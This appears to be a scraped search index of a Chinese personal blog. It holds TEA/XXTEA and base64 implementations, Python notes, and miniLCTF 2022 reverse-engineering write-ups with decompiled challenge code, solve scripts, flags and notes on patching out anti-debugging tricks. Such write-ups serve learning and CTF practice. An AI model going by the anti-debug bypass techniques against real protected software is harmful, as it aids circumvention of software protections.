unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i \u003c num_rounds; i++) { v0 += (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); sum += delta; v1 += (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum\u003e\u003e11) \u0026 3]); } v[0]=v0; v[1]=v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i \u003c num_rounds; i++) { v1 -= (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum\u003e\u003e11) \u0026 3]); sum -= delta; v0 -= (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); } v[0]=v0; v[1]=v1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:6:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"XXTEA #define MX ((z\u003e\u003e5^y\u003c\u003c2) + (y\u003e\u003e3^z\u003c\u003c4) ^ (sum^y) + (k[p\u00263^e]^z)) long btea(long* v, long n, long* k) { unsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x9e3779b9; long p, q ; if (n \u003e 1) { /* Coding Part */ q = 6 + 52/n; while (q-- \u003e 0) { sum += DELTA; e = (sum \u003e\u003e 2) \u0026 3; for (p=0; p\u003cn-1; p++) y = v[p+1], z = v[p] += MX; y = v[0]; z = v[n-1] += MX; } return 0 ; } else if (n \u003c -1) { /* Decoding Part */ n = -n; q = 6 + 52/n; sum = q*DELTA ; while (sum != 0) { e = (sum \u003e\u003e 2) \u0026 3; for (p=n-1; p\u003e0; p--) z = v[p-1], y = v[p] -= MX; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } return 0; } return 1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:7:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"base64编码 ","date":"2022-07-10","objectID":"/2022/07/base64/:0:0","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"编码原理 Base64是一种基于64个可打印字符来表示二进制数据的表示方法 由于$\\log_{2}{64}=6$，所以每6个比特为一个单元，对应一个可打印字符。3个字节即24个比特，对应4个Base64单元，故4个可打印字符表示3个字节的信息 如果被编码的字节数不能被3整除（多出1个或2个字节），那么先在末尾补1个或2个字节的0值，使其能够被3整除。然后进行base64编码，末尾每有6比特0值就在base64编码文本后加有一个‘’=‘’号 ","date":"2022-07-10","objectID":"/2022/07/base64/:1:0","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"编码过程 定义base64编码对应表 计算编码后的文本长度 3个字节对应4个Base64单元进行编码 如果需要则补‘’=‘‘ ","date":"2022-07-10","objectID":"/2022/07/base64/:2:0","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"C语言实现 unsigned char* base64_encode(unsigned char* str) { // 1. define the base64 table unsigned char table[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // 2. calculate the length of string after base64 encoding int str_len = strlen(str); int len; if (str_len % 3 == 0) { len = str_len / 3 * 4; } else { len = (str_len/3 + 1) * 4; } // 3. Encoding as a group of three 8-bit characters unsigned char *res = malloc(sizeof(unsigned char) * len + 1); res[len] = '\\0'; int i, j; for(i=0, j=0; j\u003cstr_len; j+=3, i+=4) { res[i] = table[str[j] \u003e\u003e 2]; res[i+1] = table[(str[j]\u00260b11) \u003c\u003c 4 | str[j+1] \u003e\u003e 4]; res[i+2] = table[(str[j+1]\u00260b1111) \u003c\u003c 2 | str[j+2] \u003e\u003e 6]; res[i+3] = table[str[j+2]\u00260b111111]; } // 4. add '=' if needed switch (str_len % 3) { case 1: res[len-1] = '='; res[len-2] = '='; break; case 2: res[len-1] = '='; break; } return res; } ","date":"2022-07-10","objectID":"/2022/07/base64/:3:0","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"逆向算法特征 将二进制文件拖入ida分析，能复原较为清晰的代码 _BYTE *__fastcall base64_encode(const char *str) { int len; // [rsp+18h] [rbp-68h] int v3; // [rsp+1Ch] [rbp-64h] int i; // [rsp+20h] [rbp-60h] int str_len; // [rsp+24h] [rbp-5Ch] _BYTE *res; // [rsp+28h] [rbp-58h] char table[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(table, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"); str_len = strlen(str); if ( str_len % 3 ) len = 4 * (str_len / 3 + 1); else len = 4 * (str_len / 3); res = malloc(len + 1LL); res[len] = 0; v3 = 0; for ( i = 0; i \u003c str_len; i += 3 ) { res[v3] = table[(unsigned __int8)str[i] \u003e\u003e 2]; res[v3 + 1] = table[((unsigned __int8)str[i + 1] \u003e\u003e 4) | (16 * str[i]) \u0026 0x30]; res[v3 + 2] = table[((unsigned __int8)str[i + 2] \u003e\u003e 6) | (4 * str[i + 1]) \u0026 0x3C]; res[v3 + 3] = table[str[i + 2] \u0026 0x3F]; v3 += 4; } if ( str_len % 3 == 1 ) { res[len - 1] = '='; res[len - 2] = '='; } else if ( str_len % 3 == 2 ) { res[len - 1] = '='; } return res; } base64编码的显著特征在于编码表table，在逆向题中常见换表或动态生成表 编码过程中的循环移位操作也是一大特征 对len的判断也必不可少，是个突破点 ","date":"2022-07-10","objectID":"/2022/07/base64/:4:0","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"/2022/07/base64/"},{"categories":["Dev"],"content":"基本输入输出 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 输入 python2： input：希望读取一个合法的python表达式 raw_input：以字符串形式读取输入 python3： 只有input：以字符串形式读取输入 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 输出 python2：print是一条语句，后不加括号 python3：print是个函数，后加括号 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"复合数据结构 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 列表 list函数：将可迭代对象类型的数据转化为列表，如元组、range对象、字符串等 del函数：删除列表特定值（下标索引）或删除整个列表，若列表对象不再有其他对象指向，python同时删除该列表对象 使用+向列表中添加元素会生成新的列表，将元素逐一赋值过去，效率较低 append函数原地修改，效率较高 extend函数将另一个迭代对象的所有元素添加至该列表的尾部，，不改变其内存首地址，属于原地操作 pop函数删除并返回指定元素（不提供下标则默认最后一个） remove函数删除首次出现的指定元素，无返回值 shallow copy：拷贝外层对象，但内层对象还是指向相同对象，切片是shallow copy deep copy：完全拷贝了对象及其子对象 列表对象的sort方法原地排序，内置函数sorted返回新列表，不改变原列表 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 元组 创建只有一个元素的元组必须在元素后加逗号 del函数只能删除整个元素，因为元组是不可变序列 使用序列解包功能为多个变量同时赋值 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 字典 字典也可以序列解包 使用 dict() 函数利用已有数据创建字典 get方法：获取指定键对应的值，若不存在，返回指定值（若未指定则默认返回none） update方法：向字典中添加键值对，可使用=、字典、元组（注意一个元素时的逗号） ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 集合 集合的交集、并集、差集等运算 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"选择与循环 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 选择 ==与is：==测试值的相等性，递归地比较所有内嵌对象，is测试二者是否是同一对象（是否在同一内存地址中） 缓存复用：对象是小的整数或字符串时，多个变量可能指向同一对象以提高性能 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 循环 while和for循环可以带else块，如果因循环表达式不成立而结束循环（不是break结束循环），则执行else中的内容 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"函数 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 可变长度参数 *parameter：接受多个形参并将其放在一个元组中 **parameter：用来接受字典形式的实参（可使用**字典解包代替） ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 函数调用时参数解包 使用列表、元组等可迭代对象作为实参，并在前面加一个分号 使用字典传参，默认使用字典的键 要保证实参形参个数相同 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- lambda函数 map函数：将函数作用的一个序列或迭代器的每一个元素上 reduce函数：将一个接受两个参数的函数以累积的方式从左到右一次作用到一个序列或迭代器的每一个元素上 python3需要from functools import reduce filter函数：将一个函数作用到一个序列上，返回序列中使该函数返回值为True的元素组成的序列 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 迭代 文件迭代器 iter函数：根据可迭代对象构造成迭代器，对应可迭代对象的__iter__方法 next函数：迭代器的下一项，对应可迭代对象的__next__方法 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 生成器 生成器函数（返回迭代器） 生成器表达式（返回迭代器） ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:5","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"类 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 类的__str__和__repr__方法 都是返回对象的字符串表示 __str__：print函数优先使用__str__，若只重载了__repr__，则使用__repr__ __repr__：除print函数以外所有地方优先使用__repr__ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 内省 内省（introspection）是指计算机程序在运行时（run time）检查对象（object）类型的一种能力，也称作运行时类型检查（run-time type checking） instance.__class__ 和 instance.__dict__方法 自定义通用显示工具类 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 装饰器 由@符号开头，后面跟着所谓的元函数（metafunction）组成，一个函数加工另一个函数 ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- 类的伪私有属性 class定义代码块内，开头有两个下划线，但结尾没有两个下划线的变量名，会自动扩展，从而包含它所在类的名称 例如，Spam类内 __x 这样的变量名会自动变成 _Spam__x ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["WriteUps"],"content":"not RC4 RISC-V 逆向，有找到ida的插件，但装上一直报错，放弃 又找到Ghidra，反编译很丑但能用，使劲看发现是个vm 大致流程及指令 0 0xf1 6 LAB_00100b7e 8 { int i; for (i = 0; i \u003c 4; i ++) { if (\u0026enc_flag[i]) != check_array[i]) { //longlong printf(\"Wrong!\"); exit(0); } } op_pointer++; return; } 0xf2 10 LAB_00100bfe 12 { if (key_num_2 \u003c opcode[op_pointer + 2]) {//0x0b op_pointer -= opcode[op_pointer + 1];//4 key_num_2 ++; } else { key_num_2 = 0; op_pointer += 3; } return; } 0xf3 14 LAB_00100974 16 key_const_1 = 0x0000000064627421; key_const_2 = 0x0000000079796473; { left_8_bytes = input_left_8_bytes + key_const_1; right_8_bytes = input_right_8_bytes + key_const_2; op_pointer += 2; return; } 0xf4 18 LAB_00100a10 20 { if (opcode[op_pointer + 1] == 0xe1) { left_8_bytes = key_const_1 + ((right_8_bytes ^ left_8_bytes) \u003e\u003e (-right_8_bytes \u0026 0x3f) | (right_8_bytes ^ left_8_bytes) \u003c\u003c (right_8_bytes \u0026 0x3fU)); left_8_bytes = key_const_1 + rol(right_8_bytes ^ left_8_bytes, 6); } if (opcode[*op_pointer + 1] == 0xe2) { right_8_bytes = key_const_2 + ((right_8_bytes ^ left_8_bytes) \u003e\u003e (-left_8_bytes \u0026 0x3f) | (right_8_bytes ^ left_8_bytes) \u003c\u003c (left_8_bytes \u0026 0x3f)); } op_pointer += 2; return; } void RC5_ENCRYPT(WORD *pt, WORD *ct) { WORD i, A = pt[0] + S[0], B = pt[1] + S[1]; for(i = 1; i \u003c= r; i++) { A = ROTL(A ^ B, B) + S[2*i]; B = ROTL(B ^ A, A) + S[2*i + 1]; } ct[0] = A; ct[1] = B; } (val \u003c\u003c r_bits%max_bits) \u0026 (2**max_bits-1) | \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e (max_bits-(r_bits%max_bits))) 0xf5 22 LAB_00100af0 24 { *(undefined8 *)(\u0026check_array + (longlong)key_num_1 * 8) = left_8_bytes; *(undefined8 *)(\u0026check_array + (longlong)(key_num_1 + 1) * 8) = right_8_bytes; left_8_bytes = 0; right_8_bytes = 0; key_num_1 += 2; op_pointer++; return; } opcode = { 0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf3, 0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff } enc_flag = { 0xca, 0x82, 0xef, 0x95, 0xbb, 0x1d, 0xc2, 0x4b, 0xbe, 0x47, 0xb5, 0x71, 0xae, 0xec, 0x7b, 0xf5, 0xcd, 0xf6, 0xe7, 0x15, 0xab, 0xbd, 0xa1, 0x80, 0x85, 0x63, 0x77, 0xe1, 0xd7, 0x93, 0xc7, 0xa3 } 最后得知整个流程是个去掉了初始化的RC5（not RC4就在这 exp from Crypto.Util.number import * enc_flag = [0x4bc21dbb95ef82ca, 0xf57becae71b547be, 0x80a1bdab15e7f6cd, 0xa3c793d7e1776385] key_const_1 = 0x0000000064627421 key_const_2 = 0x0000000079796473 rol = lambda val, r_bts, max_bits: \\ (val \u003c\u003c r_bits%max_bits) \u0026 (2**max_bits-1) | \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e (max_bits-(r_bits%max_bits))) ror = lambda val, r_bits, max_bits: \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e r_bits%max_bits) | \\ (val \u003c\u003c (max_bits-(r_bits%max_bits)) \u0026 (2**max_bits-1)) left_8_bytes = 0x4bc21dbb95ef82ca right_8_bytes = 0xf57becae71b547be for j in range(12): right_8_bytes = ror((right_8_bytes - key_const_2), left_8_bytes, 64) ^ left_8_bytes left_8_bytes = ror((left_8_bytes - key_const_1), right_8_bytes,64) ^ right_8_bytes left_8_bytes -= key_const_1 right_8_bytes -= key_const_2 print(long_to_bytes(left_8_bytes), long_to_bytes(right_8_bytes)) 字节序问题，最后要逆过来看 flagminiLCTF{I_hate_U_r1sc-V!} ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:1:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"lemon lemon语言逆向，给了一段字节码 吐槽一下官方仓库readme写得太简略了，费了好大劲才搞懂工具怎么用 然后就是体力活了 猜一下，写点代码，\\dis一下，和题目文件比对一下，还原源代码 var v0 = 221492336; def next(){ v0 = (v0*3735928559 + 2974593325) % 4294967295; return v0; } class RunMe(){ def __init__(var n){ self.enc = []; self.flag = []; self.res = [2141786733, 76267819, 37219027, 219942343, 755999918, 701306806, 532732060, 334234642, 524809386, 333469062, 160092960, 126810196, 238089888, 301365991, 258515107, 424705310, 1041878913, 618187854, 4680810, 827308967, 66957703, 924471115, 735310319, 541128627, 47689903, 459905620, 495518230, 167708778, 586337393, 521761774, 861166604, 626644061, 1030425184, 665229750, 330150339]; for (var v1=0; v1\u003cn; v1+=1){ self.enc.append(next()); } } def sign(var x, var y){ for(var v2=0; v2\u003c35; v2+=1){ self.flag.append(x[v2] ^ y[v2]); } } } print(\"Starting\"); var v5 = RunMe(35); v5.sign(v5.res, v5.enc); print(v5.flag); print(\"Done\"); 运行得flag flagminiLctf{l3m0n_1s_s0_s0urrR77RrrR7} ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:2:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"whatAssembly 在js里藏着一个flag.wasm，直接请求下载就行 下载官方工具包wabt 使用wasm2c工具将wasm文件反编译成flag.c文件，./wasm2c wasm.wasm -o wasm.c，但是可读性不高 继续优化，把wasm-rt.h和wasm.h和flag.c放在同一目录下，gcc -c flag.c -o flag，进行只编译不链接，这一步可能会出奇怪的问题，目前原因不明 成功后就可拖进ida进行静态分析，会好看很多 前面还尝试了jeb4.0（支持wasm直接反汇编/反编译），可用，但巨丑，效果远不如ida，故放弃 以下结合出题人放出的源码分析，附带详细注释 check函数 __int64 __fastcall w2c_check(unsigned int flag, unsigned int key, unsigned int enc) { int v3; // eax unsigned int check_sp; // [rsp+24h] [rbp-47Ch] unsigned int v7; // [rsp+40h] [rbp-460h] unsigned int v8; // [rsp+44h] [rbp-45Ch] unsigned int v9; // [rsp+48h] [rbp-458h] unsigned int v10; // [rsp+4Ch] [rbp-454h] unsigned int v11; // [rsp+50h] [rbp-450h] unsigned int v12; // [rsp+54h] [rbp-44Ch] signed int v13; // [rsp+90h] [rbp-410h] int v14; // [rsp+B4h] [rbp-3ECh] unsigned int flag_cpy_len; // [rsp+DCh] [rbp-3C4h] unsigned int v16; // [rsp+E0h] [rbp-3C0h] unsigned int flag_cpy_addr; // [rsp+E4h] [rbp-3BCh] unsigned int v18; // [rsp+E8h] [rbp-3B8h] unsigned int v19; // [rsp+ECh] [rbp-3B4h] unsigned int v20; // [rsp+F4h] [rbp-3ACh] unsigned int v21; // [rsp+F8h] [rbp-3A8h] int key_addr; // [rsp+120h] [rbp-380h] unsigned int v23; // [rsp+128h] [rbp-378h] unsigned int v24; // [rsp+12Ch] [rbp-374h] unsigned int v25; // [rsp+140h] [rbp-360h] int i; // [rsp+160h] [rbp-340h] int v27; // [rsp+194h] [rbp-30Ch] int v28; // [rsp+198h] [rbp-308h] int v29; // [rsp+1A0h] [rbp-300h] unsigned int v30; // [rsp+1A8h] [rbp-2F8h] int v31; // [rsp+1B4h] [rbp-2ECh] int v32; // [rsp+300h] [rbp-1A0h] int v33; // [rsp+30Ch] [rbp-194h] int v34; // [rsp+324h] [rbp-17Ch] char v35; // [rsp+32Ch] [rbp-174h] unsigned int v36; // [rsp+34Ch] [rbp-154h] char v37; // [rsp+374h] [rbp-12Ch] unsigned int v38; // [rsp+39Ch] [rbp-104h] int v39; // [rsp+3A0h] [rbp-100h] int v40; // [rsp+3ACh] [rbp-F4h] int v41; // [rsp+3BCh] [rbp-E4h] char v42; // [rsp+3CCh] [rbp-D4h] unsigned int v43; // [rsp+3ECh] [rbp-B4h] char v44; // [rsp+414h] [rbp-8Ch] unsigned int v45; // [rsp+43Ch] [rbp-64h] unsigned int v46; // [rsp+458h] [rbp-48h] unsigned int v47; // [rsp+460h] [rbp-40h] int v48; // [rsp+46Ch] [rbp-34h] unsigned int v49; // [rsp+470h] [rbp-30h] unsigned int v50; // [rsp+470h] [rbp-30h] unsigned int v51; // [rsp+470h] [rbp-30h] unsigned int v52; // [rsp+470h] [rbp-30h] unsigned int v53; // [rsp+470h] [rbp-30h] unsigned int v54; // [rsp+470h] [rbp-30h] unsigned int v55; // [rsp+474h] [rbp-2Ch] __int64 v56; // [rsp+480h] [rbp-20h] __int64 v57; // [rsp+498h] [rbp-8h] w2c___stack_pointer -= 112; // new vm stack frame check_sp = w2c___stack_pointer; i32_store(\u0026w2c_memory, (unsigned int)w2c___stack_pointer + 104LL, flag);// push flag i32_store(\u0026w2c_memory, check_sp + 100LL, key);// push key i32_store(\u0026w2c_memory, check_sp + 96LL, enc); // push enc v56 = i64_load(\u0026w2c_memory, 1032LL); i64_store(\u0026w2c_memory, check_sp + 88, v56); // table v57 = i64_load(\u0026w2c_memory, 1024LL); i64_store(\u0026w2c_memory, check_sp + 80, v57); // another table v7 = i32_load(\u0026w2c_memory, check_sp + 104LL); // push len(flag) v8 = w2c_strlen(v7); i32_store(\u0026w2c_memory, check_sp + 76LL, v8); v9 = i32_load(\u0026w2c_memory, check_sp + 100LL); // push len(key) v10 = w2c_strlen(v9); i32_store(\u0026w2c_memory, check_sp + 72LL, v10); v11 = i32_load(\u0026w2c_memory, check_sp + 96LL); // push len(enc) v12 = w2c_strlen(v11); i32_store(\u0026w2c_memory, check_sp + 68LL, v12); if ( (int)i32_load(\u0026w2c_memory, check_sp + 72LL) \u003e= 8// len(key) \u003e= 8 \u0026\u0026 (v13 = 4 * i32_load(\u0026w2c_memory, check_sp + 76LL), v13 \u003e (int)(i32_load(\u0026w2c_memory, check_sp + 68LL) - 32))// 4 * len(flag) \u003e len(enc) - 32 \u0026\u0026 (v14 = 4 * i32_load(\u0026w2c_memory, check_sp + 76LL), v14 \u003c= (int)i32_load(\u0026w2c_memory, check_sp + 68LL)) )// 4 * len(flag) \u003c= len(enc) { flag_cpy_len = (i32_load(\u0026w2c_memory, check_sp + 76LL) + 15) \u0026 0xFFFFFFF0;// flag_cpy_len = (flag_len + 15) \u0026 ~15 i32_store(\u0026w2c_memory, check_sp + 64LL, flag_cpy_len); v16 = i32_load(\u0026w2c_memory, check_sp + 64LL); flag_cpy_addr = w2c_dlmalloc(v16); // malloc(flag_cpy_len) i32_store(\u0026w2c_memory, check_sp + 60LL, flag","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:3:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"twin ref:P.Z.师傅的wp 创建或终止线程时，TLS回调函数都会自动调用执行 在ida里找到TlsCallback_0，打开是空的，原因是里面有个反调试 有一句call $+5实际是原地tp，后一句计算正确的地址，然后retn实现跳转，直接把它从这句一直到retn全都nop掉即可，后面还有很多处同理 修复后的TlsCallback_0函数 void __cdecl TlsCallback_0(int a1, int a2) { char *v2; // eax char Buffer[80]; // [esp+10h] [ebp-11Ch] BYREF struct _STARTUPINFOA StartupInfo; // [esp+60h] [ebp-CCh] BYREF struct _PROCESS_INFORMATION ProcessInformation; // [esp+A4h] [ebp-88h] BYREF char v7[22]; // [esp+B8h] [ebp-74h] BYREF char v8[4]; // [esp+CEh] [ebp-5Eh] BYREF char v9[44]; // [esp+D4h] [ebp-58h] BYREF char v10[12]; // [esp+100h] [ebp-2Ch] BYREF CHAR Name[8]; // [esp+10Ch] [ebp-20h] BYREF CHAR ApplicationName[8]; // [esp+114h] [ebp-18h] BYREF char v13[8]; // [esp+11Ch] [ebp-10h] BYREF char Format[7]; // [esp+124h] [ebp-8h] BYREF uint8_t v15; // [esp+12Bh] [ebp-1h] if ( a2 == 1 ) { memset(Buffer, 0, sizeof(Buffer)); sub_401930(Buffer); v15 = 0; v15 = NtCurrentPeb()-\u003eBeingDebugged; if ( !v15 ) *(\u0026TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; strcpy(Name, \"93\u003e8\"); sub_4018C0(Name); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); v7[0] = 47; v7[1] = 19; v7[2] = 26; v7[3] = 30; v7[4] = 12; v7[5] = 26; v7[6] = 95; v7[7] = 22; v7[8] = 17; v7[9] = 15; v7[10] = 10; v7[11] = 11; v7[12] = 95; v7[13] = 6; v7[14] = 16; v7[15] = 10; v7[16] = 13; v7[17] = 95; v7[18] = 25; v7[19] = 19; v7[20] = 30; v7[21] = 24; strcpy(v8, \"E_\"); v2 = (char *)sub_4018C0(v7); sub_401930(v2); Format[0] = 90; Format[1] = 12; Format[2] = 0; sub_4018C0(Format); sub_401130(Format, dword_404448[0]); } if ( !a2 ) { ApplicationName[0] = 81; ApplicationName[1] = 80; ApplicationName[2] = 11; ApplicationName[3] = 18; ApplicationName[4] = 15; ApplicationName[5] = 0; sub_4018C0(ApplicationName); sub_401410(); memset(\u0026StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(ApplicationName, 0, 0, 0, 0, 3u, 0, 0, \u0026StartupInfo, \u0026ProcessInformation); v10[0] = 28; v10[1] = 16; v10[2] = 13; v10[3] = 13; v10[4] = 26; v10[5] = 28; v10[6] = 11; v10[7] = 117; v10[8] = 0; v13[0] = 8; v13[1] = 13; v13[2] = 16; v13[3] = 17; v13[4] = 24; v13[5] = 117; v13[6] = 0; v9[0] = 47; v9[1] = 19; v9[2] = 26; v9[3] = 30; v9[4] = 12; v9[5] = 26; v9[6] = 95; v9[7] = 28; v9[8] = 19; v9[9] = 16; v9[10] = 12; v9[11] = 26; v9[12] = 95; v9[13] = 11; v9[14] = 23; v9[15] = 26; v9[16] = 95; v9[17] = 27; v9[18] = 26; v9[19] = 29; v9[20] = 10; v9[21] = 24; v9[22] = 24; v9[23] = 26; v9[24] = 13; v9[25] = 95; v9[26] = 30; v9[27] = 17; v9[28] = 27; v9[29] = 95; v9[30] = 11; v9[31] = 13; v9[32] = 6; v9[33] = 95; v9[34] = 30; v9[35] = 24; v9[36] = 30; v9[37] = 22; v9[38] = 17; v9[39] = 117; v9[40] = 0; sub_401510(ApplicationName, (int)\u0026ProcessInformation); if ( dword_404440 == 1 ) { sub_4012C0((_DWORD *)(*(_DWORD *)dword_404448 + 20), 5, (int)\u0026unk_40405C); if ( !memcmp((const void *)(*(_DWORD *)dword_404448 + 20), \u0026unk_40402C, 0x14u) ) { sub_4018C0(v10); sub_401930(v10); LABEL_13: CloseHandle(hObject); return; } } else if ( dword_404440 == -2 ) { sub_4018C0(v9); sub_401930(v9); goto LABEL_13; } sub_4018C0(v13); sub_401930(v13); goto LABEL_13; } } 其中a2存储了是创建进程还是退出进程的状态，从而执行不同的代码 在程序开始的时候首先进入第一个if中的内容 注意下面两句 if ( !v15 ) *(\u0026TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; 把sub_401D60放在了TlsCallbacks之后，形成了个列表，创建或终止线程时会依次调用这两个函数 接下来重点在用创建了新的文件tmp 动调可得sub_401130是scanf的功能 接着会进入上面在TlsCallbacks之后加上的sub_401D60 void __cdecl __noreturn sub_401D60(int a1, int a2) { CHAR ModuleName[16]; // [esp+0h] [ebp-1Ch] BYREF CHAR ProcName[12]; // [esp+10h] [ebp-Ch] BYREF if ( a2 == 1 ) { ProcName[0] = 40; ProcName[1] = 13; ProcName[2] = 22; ProcName[3] = 11; ProcName[4] = 26; ProcName[5] = 57; ProcName[6] = 22; ProcName[7] = 19; ProcName[8] = 26; ProcName[9] = 0; ModuleName[0] = 20; ModuleName[1] = 26; ModuleName[2] = 13; ModuleName[3] = 17; ModuleName[4] = 26; ModuleName[5] = 19; ModuleName[6] = 76; ModuleName[7] = 77; ModuleName[8] = 81; ModuleName[9] = 27; ModuleName[10] = ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:4:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"CyberServer 咕咕咕 等我啥时候能写个这玩意再回来看吧 